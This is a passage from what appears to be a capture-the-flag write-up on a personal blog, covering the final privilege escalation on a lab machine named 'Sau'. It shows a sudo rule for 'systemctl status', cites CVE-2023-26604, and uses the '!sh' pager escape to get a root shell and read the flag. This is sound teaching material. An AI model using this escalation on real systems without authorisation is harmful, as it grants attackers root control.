+If we execute <code>sudo -l</code> to list our sudoers privileges, we notice the following:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">puma</span> <span class="n">on</span> <span class="n">sau</span><span class="p">:</span>
+    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
+    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span>
+
+<span class="n">User</span> <span class="n">puma</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">sau</span><span class="p">:</span>
+    <span class="p">(</span><span class="n">ALL</span> <span class="p">:</span> <span class="n">ALL</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+<span class="nd">puma@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span>
+</pre></div>
+
+We can execute <code>/usr/bin/systemctl status trail.service</code> as any user on the system without specifying the user password.<br/><br/>
+After searching for information on the internet about <code>systemctl status</code>, I found a vulnerability associated with privilege escalation. This <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26604">NVD article</a> explains the vulnerability.<br/><br/>
+<em>"systemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the "systemctl status" command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.</em><br/><br/>
+As you might know, in the <code>less</code> program, you can execute commands using the <code>!</code> character. For example, if you want to execute the <code>whoami</code> command, you can simply type <code>!whoami</code>. Since we are running <code>less</code> as root (as explained above), we could execute commands as this user.<br/><br/>
+Let's attempt to obtain a <code>/bin/sh</code> as root by running <code>!sh</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">puma</span><span class="nd">@sau</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">maltrail</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+<span class="err">●</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span> <span class="o">-</span> <span class="n">Maltrail</span><span class="o">.</span> <span class="n">Server</span> <span class="n">of</span> <span class="n">malicious</span> <span class="n">traffic</span> <span class="n">detection</span> <span class="n">system</span>
+     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">vendor</span> <span class="n">preset</span><span class="p">:</span><span class="o">&gt;</span>
+     <span class="n">Active</span><span class="p">:</span> <span class="n">active</span> <span class="p">(</span><span class="n">running</span><span class="p">)</span> <span class="n">since</span> <span class="n">Thu</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">04</span> <span class="mi">16</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">08</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">1</span><span class="n">h</span> <span class="mi">23</span><span class="nb">min</span> <span class="n">ago</span>
+       <span class="n">Docs</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="c1">#readme</span>
+             <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="o">/</span><span class="n">wiki</span>
+   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">897</span> <span class="p">(</span><span class="n">python3</span><span class="p">)</span>
+      <span class="n">Tasks</span><span class="p">:</span> <span class="mi">11</span> <span class="p">(</span><span class="n">limit</span><span class="p">:</span> <span class="mi">4662</span><span class="p">)</span>
+     <span class="n">Memory</span><span class="p">:</span> <span class="mf">27.4</span><span class="n">M</span>
+     <span class="n">CGroup</span><span class="p">:</span> <span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">├─</span> <span class="mi">897</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="n">server</span><span class="o">.</span><span class="n">py</span>
+             <span class="err">├─</span><span class="mi">1311</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">"maltrail[897]"</span> <span class="s2">"Failed p&gt;</span>
+             <span class="err">├─</span><span class="mi">1312</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">"maltrail[897]"</span> <span class="s2">"Failed p&gt;</span>
+             <span class="err">├─</span><span class="mi">1314</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1315</span> <span class="n">bash</span> <span class="o">-</span><span class="n">i</span>
+             <span class="err">├─</span><span class="mi">1323</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1324</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1340</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">├─</span><span class="mi">1342</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">└─</span><span class="mi">1343</span> <span class="n">pager</span>
+
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">27</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1217</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">3</span><span class="o">&gt;</span>
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1241</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">5</span><span class="o">&gt;</span>
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">01</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1255</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">4</span><span class="o">&gt;</span>
+                    <span class="err">●</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span> <span class="o">-</span> <span class="n">Maltrail</span><span class="o">.</span> <span class="n">Server</span> <span class="n">of</span> <span class="n">malicious</span> <span class="n">traffic</span> <span class="n">detection</span> <span class="n">system</span>
+     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">vendor</span> <span class="n">preset</span><span class="p">:</span><span class="o">&gt;</span>
+     <span class="n">Active</span><span class="p">:</span> <span class="n">active</span> <span class="p">(</span><span class="n">running</span><span class="p">)</span> <span class="n">since</span> <span class="n">Thu</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">04</span> <span class="mi">16</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">08</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">1</span><span class="n">h</span> <span class="mi">23</span><span class="nb">min</span> <span class="n">ago</span>
+       <span class="n">Docs</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="c1">#readme</span>
+             <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stamparm</span><span class="o">/</span><span class="n">maltrail</span><span class="o">/</span><span class="n">wiki</span>
+   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">897</span> <span class="p">(</span><span class="n">python3</span><span class="p">)</span>
+      <span class="n">Tasks</span><span class="p">:</span> <span class="mi">11</span> <span class="p">(</span><span class="n">limit</span><span class="p">:</span> <span class="mi">4662</span><span class="p">)</span>
+     <span class="n">Memory</span><span class="p">:</span> <span class="mf">27.4</span><span class="n">M</span>
+     <span class="n">CGroup</span><span class="p">:</span> <span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">├─</span> <span class="mi">897</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="n">server</span><span class="o">.</span><span class="n">py</span>
+             <span class="err">├─</span><span class="mi">1311</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">"maltrail[897]"</span> <span class="s2">"Failed p&gt;</span>
+             <span class="err">├─</span><span class="mi">1312</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="n">logger</span> <span class="o">-</span><span class="n">p</span> <span class="n">auth</span><span class="o">.</span><span class="n">info</span> <span class="o">-</span><span class="n">t</span> <span class="s2">"maltrail[897]"</span> <span class="s2">"Failed p&gt;</span>
+             <span class="err">├─</span><span class="mi">1314</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1315</span> <span class="n">bash</span> <span class="o">-</span><span class="n">i</span>
+             <span class="err">├─</span><span class="mi">1323</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1324</span> <span class="n">bash</span>
+             <span class="err">├─</span><span class="mi">1340</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">├─</span><span class="mi">1342</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">systemctl</span> <span class="n">status</span> <span class="n">trail</span><span class="o">.</span><span class="n">service</span>
+             <span class="err">└─</span><span class="mi">1343</span> <span class="n">pager</span>
+
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">27</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1217</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">3</span><span class="o">&gt;</span>
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1241</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">5</span><span class="o">&gt;</span>
+<span class="n">Jan</span> <span class="mi">04</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">01</span> <span class="n">sau</span> <span class="n">maltrail</span><span class="p">[</span><span class="mi">1255</span><span class="p">]:</span> <span class="n">Failed</span> <span class="n">password</span> <span class="k">for</span> <span class="p">;</span> <span class="kn">from</span> <span class="mf">127.0.0.1</span> <span class="n">port</span> <span class="mi">4</span><span class="o">&gt;</span>
+<span class="err">!</span><span class="n">sh</span>
+<span class="c1"># whoami</span>
+<span class="n">root</span>
+</pre></div>
+
+Finally, we can read <code>root.txt</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="c1"># cat /root/root.txt</span>
+<span class="mi">6214</span><span class="o">*************************</span><span class="mi">5420</span>
+<span class="c1">#</span>
+</pre></div></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
